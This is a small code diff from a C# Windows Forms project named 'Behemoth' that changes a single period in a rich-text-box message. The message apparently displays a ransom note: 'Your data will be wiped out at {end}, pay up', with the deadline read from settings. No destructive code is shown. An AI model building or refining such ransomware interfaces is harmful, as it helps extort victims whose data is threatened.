@@ -26,7 +26,7 @@ namespace Behemoth
             richTextBox4.AutoSize = true;
 
             var end = Properties.Settings.Default.End;
-            richTextBox4.Text = $"Your data will be wiped out at {end}, pay up..";
+            richTextBox4.Text = $"Your data will be wiped out at {end}, pay up.";
             richTextBox4.SelectAll();
             richTextBox4.SelectionAlignment = HorizontalAlignment.Center;
         }
